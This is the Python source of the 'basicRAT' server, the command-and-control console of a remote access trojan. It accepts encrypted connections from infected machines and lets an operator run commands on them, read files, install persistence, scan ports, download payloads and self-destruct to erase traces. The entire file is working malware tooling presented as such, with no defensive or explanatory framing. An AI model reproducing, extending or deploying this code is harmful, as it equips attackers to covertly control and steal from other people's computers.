#!/usr/bin/env python

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import socket
import sys
import threading
import traceback

from core.crypto import diffiehellman, AESCipher

# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
CLIENT_COMMANDS = ['cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
                   'selfdestruct', 'survey', 'unzip', 'wget']
HELP_TEXT = '''Command             | Description
---------------------------------------------------------------------------
cat <file>          | Output a file to the screen.
client <id>         | Connect to a client.
clients             | List connected clients.
estatus <id, s>     | Status of the C2C communication (default encrypted). <id> of the client, <s> status of encryption level [t/f to on/off encryption].
execute <command>   | Execute a command on the target.
goodbye             | Exit the server and selfdestruct all clients.
help                | Show this help menu.
kill                | Kill the client connection.
ls                  | List files in the current directory.
persistence         | Apply persistence mechanism.
pwd                 | Get the present working directory.
quit                | Exit the server and keep all clients alive.
scan <ip>           | Scan top 25 TCP ports on a single host.
selfdestruct        | Remove all traces of the RAT from the target system.
survey              | Run a system survey.
unzip <file>        | Unzip a file.
wget <url>          | Download a file from the web.'''


class Server(threading.Thread):
    clients = {}
    client_count = 1
    current_client = None

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        # self.s.bind(('', port))
        self.s.listen(5)

    # def run(self):
    #     while True:
    #         conn, addr = self.s.accept()
    #         print('Connected by', addr)
    #         dhkey = diffiehellman(conn)
    #         cipher = AESCipher(dhkey)
    #         client_id = self.client_count
    #         client = ClientConnection(conn, addr, cipher, uid=client_id)
    #         self.clients[client_id] = client
    #         self.client_count += 1

    def run(self):
        while True:
            conn, addr = self.s.accept()
            print('Connected by', addr)
            dhkey = diffiehellman(conn)
            cipher = AESCipher(dhkey)
            client_id = addr[0] + ':' + str(addr[1])
            client = ClientConnection(conn, addr, cipher, uid=client_id)

            if client_id in self.clients:
                prev_client = self.clients[client_id]
                prev_client.conn.close()
            self.clients[client_id] = client

    def encryption_status(self, param):
        try:
            param = param.split(' ')
            client_id, status = param[0], param[1]
            client = self.clients[client_id]
            if status == 'f':
                self.send_client('disableencrypt', client)
                client.encryption_status = False
            elif status == 't':
                self.send_client('enableencrypt', client)
                client.encryption_status = True
            else:
                print("Error: type t/f to turn on/off encryption")
        except Exception as e:
            print("Error: {}".format(traceback.format_exc()))

    def send_client(self, message, client):
        try:
            if client.encryption_status:
                # enc_message = encrypt(message, client.dhkey)
                enc_message = client.cipher.encrypt(message)
                client.conn.send(enc_message)
            else:
                client.conn.send(message.encode())
        except Exception as e:
            print('Error: {}'.format(e))
            traceback.print_exc()

    def recv_client(self, client):
        try:
            # first receive message length
            raw_msglen = client.conn.recv(1024)
            # print("raw_msglen: {}".format(raw_msglen))
            if client.encryption_status:
                raw_msglen = client.cipher.decrypt(raw_msglen)
                msglen = int(raw_msglen)
            else:
                msglen = int_from_bytes(raw_msglen)

            # print("Message len: {}".format(msglen))

            recv_data = recvall(client.conn, msglen)
            # print(recv_data)
            if client.encryption_status:
                plain_data = client.cipher.decrypt(recv_data)
                print(plain_data)
            else:
                print(recv_data.decode())
        except Exception as e:
            print('Error: {}'.format(e))
            traceback.print_exc()

    def select_client(self, client_id):
        try:
            # self.current_client = self.clients[int(client_id)]
            self.current_client = self.clients[client_id]
            print('Client {} selected.'.format(client_id))
        except (KeyError, ValueError):
            print('Error: Invalid Client ID.')
            traceback.print_exc()

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        self.send_client('kill', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def selfdestruct_client(self, _):
        self.send_client('selfdestruct', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print('ID | Client Address\n-------------------')
        for k, v in self.clients.items():
            print('{:>2} | {}'.format(k, v.addr[0]))

    def quit_server(self, _):
        if input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def goodbye_server(self, _):
        if input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('selfdestruct', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def print_help(self, _):
        print(HELP_TEXT)

def int_from_bytes(xbytes: bytes) -> int:
    return int.from_bytes(xbytes, 'big')

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


def send_client(message, client):
    try:
        if client.encryption_status:
            enc_message = client.cipher.encrypt(message)
            client.conn.send(enc_message)
        else:
            client.conn.send(message.encode())
    except Exception as e:
        print('Error: {}'.format(e))
        traceback.print_exc()


def recv_client(client):
    try:
        recv_data = client.conn.recv(10000000)
        if client.encryption_status:
            plain_data = client.cipher.decrypt(recv_data)
            print(plain_data)
        else:
            print(recv_data.decode())
    except Exception as e:
        print('Error: {}'.format(e))
        traceback.print_exc()


class ClientConnection():
    def __init__(self, conn, addr, cipher, uid=0):
        self.conn = conn
        self.addr = addr
        self.cipher = cipher
        self.uid = uid
        self.encryption_status = True


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    port = args['port']
    client = None

    print(BANNER)

    # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print('basicRAT server listening for connections on port {}.'.format(port))

    # server side commands
    server_commands = {
        'client': server.select_client,
        'clients': server.list_clients,
        'goodbye': server.goodbye_server,
        'help': server.print_help,
        'kill': server.kill_client,
        'quit': server.quit_server,
        'selfdestruct': server.selfdestruct_client,
        'estatus': server.encryption_status
    }

    def completer(text, state):
        commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()]

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    # turn tab completion on
    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    while True:
        if server.current_client:
            ccid = server.current_client.uid
        else:
            ccid = '?'

        prompt = input('\n[{}] basicRAT> '.format(ccid)).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        if cmd in server_commands:
            try:
                server_commands[cmd](action)
            except TypeError as e:
                print("Error: {}".format(e))

        elif cmd in CLIENT_COMMANDS:
            if ccid == '?':
                print('Error: No client selected.')
                continue

            print('Running {}...'.format(cmd))
            server.send_client(prompt, server.current_client)
            server.recv_client(server.current_client)
            # sending_thread = threading.Thread(target=send_client, args=(prompt, server.current_client))
            # sending_thread.setDaemon(True)
            # sending_thread.start()
            #
            # receiving_thread = threading.Thread(target=recv_client, args=(server.current_client))
            # receiving_thread.setDaemon(True)
            # receiving_thread.start()

        else:
            print('Invalid command, type "help" to see a list of commands.')


if __name__ == '__main__':
    main()
